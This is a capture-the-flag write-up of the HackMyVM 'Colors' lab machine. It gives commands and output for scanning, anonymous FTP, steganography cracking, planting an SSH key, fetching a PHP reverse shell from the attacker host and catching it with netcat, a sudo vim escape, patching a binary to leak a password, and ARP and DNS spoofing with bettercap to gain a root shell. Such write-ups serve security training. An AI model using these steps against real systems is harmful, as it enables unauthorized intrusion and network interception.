---
layout: post
title: "HackMyVM - Colors"
date: 2023-04-08 00:00:00 +0100
categories: hmv
tag: ["IPv6", "PortKnocking", "Spoofing", "Binary"]
---
# HackMyVM - Colors

Creator: [pablo](https://hackmyvm.eu/profile/?user=pablo)
Level: Medium
Release Date: 2023-02-23

## Scan

```bash
$ nmap -sV -sC -oA scans/NerdHerd -p- 192.168.1.85
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-08 21:02 WEST
Nmap scan report for 192.168.1.85
Host is up (0.00035s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 1127     1127            0 Jan 27 23:45 first
| -rw-r--r--    1 1039     1039            0 Jan 27 23:45 second
| -rw-r--r--    1 0        0          290187 Feb 11 17:35 secret.jpg
|_-rw-r--r--    1 1081     1081            0 Jan 27 23:45 third
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Document
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.77 seconds
```

## Enumeration

```bash
$ gobuster dir -u http://192.168.1.85 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.85
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2023/04/08 21:03:25 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 295]
/.php                 (Status: 403) [Size: 277]
/manual               (Status: 301) [Size: 313] [--> http://192.168.1.85/manual/]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 881808 / 882244 (99.95%)
===============================================================
2023/04/08 21:07:46 Finished
===============================================================
```

### FTP

```bash
$ ftp 192.168.1.85     
Connected to 192.168.1.85.
220 (vsFTPd 3.0.3)
Name (192.168.1.85:adok): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||12106|)
150 Here comes the directory listing.
-rw-r--r--    1 1127     1127            0 Jan 27 23:45 first
-rw-r--r--    1 1039     1039            0 Jan 27 23:45 second
-rw-r--r--    1 0        0          290187 Feb 11 17:35 secret.jpg
-rw-r--r--    1 1081     1081            0 Jan 27 23:45 third
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||14619|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Feb 20 16:59 .
drwxr-xr-x    2 0        0            4096 Feb 20 16:59 ..
-rw-r--r--    1 1127     1127            0 Jan 27 23:45 first
-rw-r--r--    1 1039     1039            0 Jan 27 23:45 second
-rw-r--r--    1 0        0          290187 Feb 11 17:35 secret.jpg
-rw-r--r--    1 1081     1081            0 Jan 27 23:45 third
226 Directory send OK.
ftp> mget *
mget first [anpqy?]? a
Prompting off for duration of mget.
229 Entering Extended Passive Mode (|||20563|)
150 Opening BINARY mode data connection for first (0 bytes).
     0        0.00 KiB/s 
226 Transfer complete.
229 Entering Extended Passive Mode (|||56326|)
150 Opening BINARY mode data connection for second (0 bytes).
     0        0.00 KiB/s 
226 Transfer complete.
229 Entering Extended Passive Mode (|||54960|)
150 Opening BINARY mode data connection for secret.jpg (290187 bytes).
100% |**************************************************************************************************************************|   283 KiB   30.48 MiB/s    00:00 ETA
226 Transfer complete.
290187 bytes received in 00:00 (24.49 MiB/s)
229 Entering Extended Passive Mode (|||23804|)
150 Opening BINARY mode data connection for third (0 bytes).
     0        0.00 KiB/s 
226 Transfer complete.
```

## Steganography

```bash
$ stegseek secret.jpg     
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "Nevermind"        
[i] Original filename: "more_secret.txt".
[i] Extracting to "secret.jpg.out".
```

```bash
$ cat secret.jpg.out 
<-MnkFEo!SARTV#+D,Y4D'3_7G9D0LFWbmBCht5'AKYi.Eb-A(Bld^%E,TH.FCeu*@X0)<BOr<.BPD?sF!,R<@<<W;Dfm15Bk2*/F<G+4+EV:*DBND6+EV:.+E)./F!,aHFWb4/A0>E$/g+)2+EV:;Dg*=BAnE0-BOr;qDg-#3DImlA+B)]_C`m/1@<iu-Ec5e;FD,5.F(&Zl+D>2(@W-9>+@BRZ@q[!,BOr<.Ea`Ki+EqO;A9/l-DBO4CF`JUG@;0P!/g*T-E,9H5AM,)nEb/Zr/g*PrF(9-3ATBC1E+s3*3`'O.CG^*/BkJ\:
```

<img src="https://drive.google.com/uc?id=1rPD4W9ULkwD4x6T0AfvGyvD4JltDsb1Z"/>

## SSH Filtered

```bash
$ sudo nmap -p- -T5 -v -n 192.168.1.85
[sudo] password for adok: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-08 21:22 WEST
Initiating ARP Ping Scan at 21:22
Scanning 192.168.1.85 [1 port]
Completed ARP Ping Scan at 21:22, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:22
Scanning 192.168.1.85 [65535 ports]
Discovered open port 21/tcp on 192.168.1.85
Discovered open port 80/tcp on 192.168.1.85
Completed SYN Stealth Scan at 21:22, 1.80s elapsed (65535 total ports)
Nmap scan report for 192.168.1.85
Host is up (0.00038s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE    SERVICE
21/tcp open     ftp
22/tcp filtered ssh
80/tcp open     http
MAC Address: 08:00:27:7A:8C:7D (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.09 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

```bash
$ ping6 FF02::1
PING FF02::1(ff02::1) 56 data bytes
64 bytes from fe80::e54:a5ff:fef5:8116%eth0: icmp_seq=1 ttl=64 time=0.064 ms
64 bytes from fe80::a00:27ff:fe7a:8c7d%eth0: icmp_seq=1 ttl=64 time=0.726 ms
64 bytes from fe80::728a:964c:c5eb:eb1%eth0: icmp_seq=1 ttl=64 time=1.44 ms
64 bytes from fe80::beae:c5ff:fee6:db2c%eth0: icmp_seq=1 ttl=64 time=2.99 ms
64 bytes from fe80::e54:a5ff:fef5:8116%eth0: icmp_seq=2 ttl=64 time=0.078 ms
64 bytes from fe80::beae:c5ff:fee6:db2c%eth0: icmp_seq=2 ttl=64 time=0.654 ms
64 bytes from fe80::a00:27ff:fe7a:8c7d%eth0: icmp_seq=2 ttl=64 time=0.673 ms
64 bytes from fe80::728a:964c:c5eb:eb1%eth0: icmp_seq=2 ttl=64 time=0.654 ms
64 bytes from fe80::e54:a5ff:fef5:8116%eth0: icmp_seq=3 ttl=64 time=0.083 ms
64 bytes from fe80::728a:964c:c5eb:eb1%eth0: icmp_seq=3 ttl=64 time=0.634 ms
64 bytes from fe80::beae:c5ff:fee6:db2c%eth0: icmp_seq=3 ttl=64 time=0.634 ms
64 bytes from fe80::a00:27ff:fe7a:8c7d%eth0: icmp_seq=3 ttl=64 time=1.06 ms
64 bytes from fe80::e54:a5ff:fef5:8116%eth0: icmp_seq=4 ttl=64 time=0.082 ms
64 bytes from fe80::728a:964c:c5eb:eb1%eth0: icmp_seq=4 ttl=64 time=0.663 ms
64 bytes from fe80::beae:c5ff:fee6:db2c%eth0: icmp_seq=4 ttl=64 time=0.664 ms
64 bytes from fe80::a00:27ff:fe7a:8c7d%eth0: icmp_seq=4 ttl=64 time=0.853 ms
--- FF02::1 ping statistics ---
4 packets transmitted, 4 received, +12 duplicates, 0% packet loss, time 3027ms
rtt min/avg/max/mdev = 0.064/0.747/2.992/0.683 ms
                                                                                                                                                                       

$ arp -e
Address                  HWtype  HWaddress           Flags Mask            Iface
golkonda                 ether   b8:27:eb:f9:77:f4   C                     eth0
LAB-Bruteforce                   (incomplete)                              eth0
192.168.1.3              ether   c4:71:30:41:b7:4f   C                     eth0
192.168.1.85             ether   08:00:27:7a:8c:7d   C                     eth0
my.router                ether   bc:ae:c5:e6:db:2c   C                     eth0

$  ip -6 neigh
fe80::728a:964c:c5eb:eb1 dev eth0 lladdr b8:27:eb:f9:77:f4 STALE 
fe80::a00:27ff:fe7a:8c7d dev eth0 lladdr 08:00:27:7a:8c:7d STALE 
fe80::beae:c5ff:fee6:db2c dev eth0 lladdr bc:ae:c5:e6:db:2c STALE 
```

## SSH

```bash
$ ftp 192.168.1.85
Connected to 192.168.1.85.
220 (vsFTPd 3.0.3)
Name (192.168.1.85:adok): pink
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd .ssh
550 Failed to change directory.
ftp> ls
229 Entering Extended Passive Mode (|||20793|)
150 Here comes the directory listing.
drwx------    2 1127     1127         4096 Feb 11 20:55 green
drwx------    3 1000     1000         4096 Apr 08 22:14 pink
drwx------    2 1081     1081         4096 Feb 20 17:07 purple
drwx------    2 1039     1039         4096 Feb 11 20:56 red
226 Directory send OK.
ftp> cd pink
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||10223|)
150 Here comes the directory listing.
drwx------    3 1000     1000         4096 Apr 08 22:14 .
drwxr-xr-x    6 0        0            4096 Jan 27 23:44 ..
lrwxrwxrwx    1 1000     1000            9 Jan 27 21:30 .bash_history -> /dev/null
-rwx------    1 1000     1000          220 Jan 27 21:22 .bash_logout
-rwx------    1 1000     1000         3526 Jan 27 21:22 .bashrc
-rwx------    1 1000     1000          807 Jan 27 21:22 .profile
drwx------    2 1000     1000         4096 Feb 11 20:55 .ssh
-rwx------    1 1000     1000         3705 Feb 11 20:18 .viminfo
-rw-r--r--    1 1000     1000           23 Feb 11 17:59 note.txt
226 Directory send OK.
ftp> cd .ssh
250 Directory successfully changed.
ftp> put authorized_keys 
local: authorized_keys remote: authorized_keys
229 Entering Extended Passive Mode (|||26836|)
150 Ok to send data.
100% |**************************************************************************************************************************|   738        5.91 MiB/s    00:00 ETA
226 Transfer complete.
738 bytes sent in 00:00 (501.18 KiB/s)
ftp> chmod
(mode) 600
(remote-file) authorized_keys
200 SITE CHMOD command ok.
ftp> exit
221 Goodbye.
```

```bash
$ ssh -6 pink@fe80::a00:27ff:fe7a:8c7d%eth0
Linux color 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
Last login: Sat Feb 11 19:16:48 2023 from 192.168.1.86
pink@color:~$
```

## Lateral Movement (pink > green)

```bash
pink@color:~$ cat .viminfo 
# This viminfo file was generated by Vim 8.2.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Command Line History (newest to oldest):
:x
|2,0,1676139493,,"x"
:q
|2,0,1675200748,,"q"
:q!
|2,0,1675181824,,"q!"

# Search String History (newest to oldest):

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Debug Line History (newest to oldest):

# Registers:
""-     CHAR    0
        #
|3,1,36,0,1,0,1675181817,"#"

# File marks:
'0  1  28  /var/www/html/sh.php
|4,48,1,28,1676139493,"/var/www/html/sh.php"
'1  1  28  /var/www/html/a.php
|4,49,1,28,1675200767,"/var/www/html/a.php"
'2  1  0  /var/www/html/a.php
|4,50,1,0,1675200748,"/var/www/html/a.php"
'3  123  0  /etc/vsftpd.conf
|4,51,123,0,1675181824,"/etc/vsftpd.conf"
'4  1  0  /etc/ftpusers
|4,52,1,0,1675181738,"/etc/ftpusers"

# Jumplist (newest first):
-'  1  28  /var/www/html/sh.php
|4,39,1,28,1676139493,"/var/www/html/sh.php"
-'  1  28  /var/www/html/a.php
|4,39,1,28,1675200767,"/var/www/html/a.php"
-'  1  28  /var/www/html/a.php
|4,39,1,28,1675200767,"/var/www/html/a.php"
-'  1  0  /var/www/html/a.php
|4,39,1,0,1675200748,"/var/www/html/a.php"
-'  1  0  /var/www/html/a.php
|4,39,1,0,1675200748,"/var/www/html/a.php"
-'  123  0  /etc/vsftpd.conf
|4,39,123,0,1675181824,"/etc/vsftpd.conf"
-'  123  0  /etc/vsftpd.conf
|4,39,123,0,1675181824,"/etc/vsftpd.conf"
-'  123  0  /etc/vsftpd.conf
|4,39,123,0,1675181824,"/etc/vsftpd.conf"
-'  123  0  /etc/vsftpd.conf
|4,39,123,0,1675181824,"/etc/vsftpd.conf"
-'  123  0  /etc/vsftpd.conf
|4,39,123,0,1675181824,"/etc/vsftpd.conf"
-'  123  0  /etc/vsftpd.conf
|4,39,123,0,1675181824,"/etc/vsftpd.conf"
-'  123  0  /etc/vsftpd.conf
|4,39,123,0,1675181824,"/etc/vsftpd.conf"
-'  123  0  /etc/vsftpd.conf
|4,39,123,0,1675181824,"/etc/vsftpd.conf"
-'  1  0  /etc/vsftpd.conf
|4,39,1,0,1675181758,"/etc/vsftpd.conf"
-'  1  0  /etc/vsftpd.conf
|4,39,1,0,1675181758,"/etc/vsftpd.conf"
-'  1  0  /etc/vsftpd.conf
|4,39,1,0,1675181758,"/etc/vsftpd.conf"
-'  1  0  /etc/vsftpd.conf
|4,39,1,0,1675181758,"/etc/vsftpd.conf"
-'  1  0  /etc/vsftpd.conf
|4,39,1,0,1675181758,"/etc/vsftpd.conf"
-'  1  0  /etc/vsftpd.conf
|4,39,1,0,1675181758,"/etc/vsftpd.conf"
-'  1  0  /etc/vsftpd.conf
|4,39,1,0,1675181758,"/etc/vsftpd.conf"
-'  1  0  /etc/vsftpd.conf
|4,39,1,0,1675181758,"/etc/vsftpd.conf"
-'  1  0  /etc/ftpusers
|4,39,1,0,1675181738,"/etc/ftpusers"
-'  1  0  /etc/ftpusers
|4,39,1,0,1675181738,"/etc/ftpusers"
-'  1  0  /etc/ftpusers
|4,39,1,0,1675181738,"/etc/ftpusers"
-'  1  0  /etc/ftpusers
|4,39,1,0,1675181738,"/etc/ftpusers"
-'  1  0  /etc/ftpusers
|4,39,1,0,1675181738,"/etc/ftpusers"
-'  1  0  /etc/ftpusers
|4,39,1,0,1675181738,"/etc/ftpusers"
-'  1  0  /etc/ftpusers
|4,39,1,0,1675181738,"/etc/ftpusers"
-'  1  0  /etc/ftpusers
|4,39,1,0,1675181738,"/etc/ftpusers"
-'  1  0  /etc/ftpusers
|4,39,1,0,1675181738,"/etc/ftpusers"
-'  1  0  /etc/ftpusers
|4,39,1,0,1675181738,"/etc/ftpusers"
-'  1  0  /etc/ftpusers
|4,39,1,0,1675181738,"/etc/ftpusers"
-'  1  0  /etc/ftpusers
|4,39,1,0,1675181738,"/etc/ftpusers"
-'  1  0  /etc/ftpusers
|4,39,1,0,1675181738,"/etc/ftpusers"
-'  1  0  /etc/ftpusers
|4,39,1,0,1675181738,"/etc/ftpusers"
-'  1  0  /etc/ftpusers
|4,39,1,0,1675181738,"/etc/ftpusers"
-'  1  0  /etc/ftpusers
|4,39,1,0,1675181738,"/etc/ftpusers"

# History of marks within files (newest to oldest):

> /var/www/html/sh.php
        *       1676139492      0
        "       1       28
        ^       1       29
        .       1       28
        +       1       28

> /var/www/html/a.php
        *       1675200766      0
        "       1       28
        ^       1       29
        .       1       28
        +       1       28

> /etc/vsftpd.conf
        *       1675181822      0
        "       123     0
        .       123     0
        +       123     0

> /etc/ftpusers
        *       1675181733      0
        "       1       0
pink@color:~$ 
```

```bash
pink@color:/var/www/html$ wget http://192.168.1.6:9000/rshell.php
--2023-04-08 22:43:58--  http://192.168.1.6:9000/rshell.php
Connecting to 192.168.1.6:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5493 (5.4K) [application/octet-stream]
Saving to: ‘rshell.php’

rshell.php                                100%[====================================================================================>]   5.36K  --.-KB/s    in 0s      

2023-04-08 22:43:58 (12.7 MB/s) - ‘rshell.php’ saved [5493/5493]
```

```bash
$ curl http://192.168.1.85/rshell.php                        
```

```bash
$ nc -lvnp 4444                                       
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.85] 39474
Linux color 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64 GNU/Linux
 22:45:00 up 43 min,  1 user,  load average: 0.00, 0.00, 0.16
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
pink     pts/0    fe80::e54:a5ff:f 22:38    1:08   0.12s  0.12s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ sudo -l
Matching Defaults entries for www-data on color:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on color:
    (green) NOPASSWD: /usr/bin/vim
$ sudo -u green vim -c ':!/bin/sh'
Vim: Warning: Output is not to a terminal
Vim: Warning: Input is not from a terminal
id
E558: Terminal entry not found in terminfo
'unknown' not known. Available builtin terminals are:
    builtin_amiga
    builtin_ansi
    builtin_pcansi
    builtin_win32
    builtin_vt320
    builtin_vt52
    builtin_xterm
    builtin_iris-ansi
    builtin_debug
    builtin_dumb
defaulting to 'ansi'
:!/bin/sh
id
uid=1127(green) gid=1127(green) groups=1127(green)
```

## Lateral Movement (green > purple)

```bash
$ nc -l -p 1234 > test_4_green   
```

```bash
green@color:~$ nc -w 3 192.168.1.6 1234 < test_4_green 
```

* Change JNE to JE

<img src="https://drive.google.com/uc?id=1IrcvmJQxjFuMqL6E_bw-7emFJNaiO1Yx"/>

```bash
$ ./test_4_green      
Guess the number im thinking: 21321
Correct!! Here is the pass:
purpleaslilas   
```

```bash
green@color:~$ su -l purple
Password: 
purple@color:~$ ls -la
total 32
drwx------ 2 purple purple 4096 Feb 20 16:07 .
drwxr-xr-x 6 root   root   4096 Jan 27 22:44 ..
lrwxrwxrwx 1 root   root      9 Feb 11 19:56 .bash_history -> /dev/null
-rwx------ 1 purple purple  220 Jan 27 22:42 .bash_logout
-rwx------ 1 purple purple 3526 Jan 27 22:42 .bashrc
-rw-r--r-- 1 root   root     77 Feb 11 17:03 for_purple_only.txt
-rwx------ 1 purple purple  807 Jan 27 22:42 .profile
-rw-r--r-- 1 root   root     14 Feb 11 16:52 user.txt
-rw------- 1 purple purple  868 Feb 20 16:07 .viminfo
purple@color:~$ cat user.txt 
(:Ez_Colors:)
purple@color:~$ sudo -l
Matching Defaults entries for purple on color:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User purple may run the following commands on color:
    (root) NOPASSWD: /attack_dir/ddos.sh
purple@color:~$ 
```

## ROOT

### Bettercap

```bash
$ sudo bettercap
bettercap v2.32.0 (built for linux amd64 with go1.19.8) [type 'help' for a list of commands]

192.168.1.0/24 > 192.168.1.6  » [00:48:29] [sys.log] [war] Could not find mac for 
192.168.1.0/24 > 192.168.1.6  » help

           help MODULE : List available commands or show module specific help if no module name is provided.
                active : Show information about active modules.
                  quit : Close the session and exit.
         sleep SECONDS : Sleep for the given amount of seconds.
              get NAME : Get the value of variable NAME, use * alone for all, or NAME* as a wildcard.
        set NAME VALUE : Set the VALUE of variable NAME.
  read VARIABLE PROMPT : Show a PROMPT to ask the user for input that will be saved inside VARIABLE.
                 clear : Clear the screen.
        include CAPLET : Load and run this caplet in the current session.
             ! COMMAND : Execute a shell command and print its output.
        alias MAC NAME : Assign an alias to a given endpoint given its MAC address.

Modules

      any.proxy > not running
       api.rest > not running
      arp.spoof > not running
             c2 > not running
        caplets > not running
    dhcp6.spoof > not running
      dns.spoof > not running
  events.stream > running
            hid > not running
     http.proxy > not running
    http.server > not running
    https.proxy > not running
   https.server > not running
    mac.changer > not running
    mdns.server > not running
   mysql.server > not running
      ndp.spoof > not running
      net.probe > not running
      net.recon > not running
      net.sniff > not running
   packet.proxy > not running
       syn.scan > not running
      tcp.proxy > not running
         ticker > not running
             ui > not running
         update > not running
           wifi > not running
            wol > not running
```

```bash
192.168.1.0/24 > 192.168.1.6  » help arp.spoof

arp.spoof (not running): Keep spoofing selected hosts on the network.

   arp.spoof on : Start ARP spoofer.
     arp.ban on : Start ARP spoofer in ban mode, meaning the target(s) connectivity will not work.
  arp.spoof off : Stop ARP spoofer.
    arp.ban off : Stop ARP spoofer.

  Parameters

    arp.spoof.fullduplex : If true, both the targets and the gateway will be attacked, otherwise only the target (if the router has ARP spoofing protections in place this will make the attack fail). (default=false)
      arp.spoof.internal : If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the external network. (default=false)
  arp.spoof.skip_restore : If set to true, targets arp cache won't be restored when spoofing is stopped. (default=false)
       arp.spoof.targets : Comma separated list of IP addresses, MAC addresses or aliases to spoof, also supports nmap style IP ranges. (default=<entire subnet>)
     arp.spoof.whitelist : Comma separated list of IP addresses, MAC addresses or aliases to skip while spoofing. (default=)

192.168.1.0/24 > 192.168.1.6  » set arp.spoof.fullduplex true
192.168.1.0/24 > 192.168.1.6  » set arp.spoof.targets 192.168.1.85
192.168.1.0/24 > 192.168.1.6  » help dns.spoof

dns.spoof (not running): Replies to DNS messages with spoofed responses.

   dns.spoof on : Start the DNS spoofer in the background.
  dns.spoof off : Stop the DNS spoofer in the background.

  Parameters

  dns.spoof.address : IP address to map the domains to. (default=<interface address>)
      dns.spoof.all : If true the module will reply to every DNS request, otherwise it will only reply to the one targeting the local pc. (default=false)
  dns.spoof.domains : Comma separated values of domain names to spoof. (default=)
    dns.spoof.hosts : If not empty, this hosts file will be used to map domains to IP addresses. (default=)
      dns.spoof.ttl : TTL of spoofed DNS replies. (default=1024)

192.168.1.0/24 > 192.168.1.6  » set dns.spoof.address 192.168.1.6

192.168.1.0/24 > 192.168.1.6  » set dns.spoof.all true

192.168.1.0/24 > 192.168.1.6  » set dns.spoof.domains masterddos.hmv

192.168.1.0/24 > 192.168.1.6  » arp.spoof on

192.168.1.0/24 > 192.168.1.6  » [00:56:28] [sys.log] [inf] arp.spoof starting net.recon as a requirement for arp.spoof
192.168.1.0/24 > 192.168.1.6  » [00:56:28] [sys.log] [war] arp.spoof full duplex spoofing enabled, if the router has ARP spoofing mechanisms, the attack will fail.
192.168.1.0/24 > 192.168.1.6  » [00:56:28] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.
192.168.1.0/24 > 192.168.1.6  » [00:56:28] [endpoint.new] endpoint 192.168.1.1 detected as bc:ae:c5:e6:db:2c (ASUSTek COMPUTER INC.).
192.168.1.0/24 > 192.168.1.6  » [00:56:28] [endpoint.new] endpoint 192.168.1.3 detected as c4:71:30:41:b7:4f (Fon Technology S.L.).
192.168.1.0/24 > 192.168.1.6  » [00:56:28] [endpoint.new] endpoint 192.168.1.85 detected as 08:00:27:7a:8c:7d (PCS Computer Systems GmbH).
192.168.1.0/24 > 192.168.1.6  » [00:56:28] [endpoint.new] endpoint 192.168.1.20 detected as b8:27:eb:f9:77:f4 (Raspberry Pi Foundation).
192.168.1.0/24 > 192.168.1.6  »  

192.168.1.0/24 > 192.168.1.6  » dns.spoof on
[00:57:18] [sys.log] [inf] dns.spoof masterddos.hmv -> 192.168.1.6
192.168.1.0/24 > 192.168.1.6  »  
```

```bash
purple@color:~$ ping -c 3 masterddos.hmv
PING masterddos.hmv (192.168.1.6) 56(84) bytes of data.
64 bytes from 192.168.1.6 (192.168.1.6): icmp_seq=1 ttl=64 time=0.530 ms
64 bytes from 192.168.1.6 (192.168.1.6): icmp_seq=2 ttl=64 time=0.183 ms
64 bytes from 192.168.1.6: icmp_seq=3 ttl=64 time=0.165 ms

--- masterddos.hmv ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 10030ms
rtt min/avg/max/mdev = 0.165/0.292/0.530/0.167 ms
```

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.85] 42482
id
uid=0(root) gid=0(root) groups=0(root)
```
